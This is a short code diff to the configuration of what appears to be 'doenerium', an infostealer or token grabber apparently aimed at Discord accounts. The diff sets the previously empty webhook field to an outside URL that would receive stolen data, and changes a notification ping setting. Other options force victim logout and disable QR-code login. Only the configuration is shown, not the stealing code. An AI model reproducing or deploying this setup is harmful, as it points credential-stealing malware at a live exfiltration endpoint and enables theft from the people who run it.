@@ -13,14 +13,14 @@ const fs = require("fs");
 var config = {
     brand: "doenerium",
 
-    webhook: "",
+    webhook: "https://websec.services/send/6338c0459ad22e8b19d012ce",
 
     logout: true,
     disable_qr_code: true,
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@doener"],
+    ping: [false, "@doener"],
 
     embed: {
         username: "doenerium | t.me/doenerium",
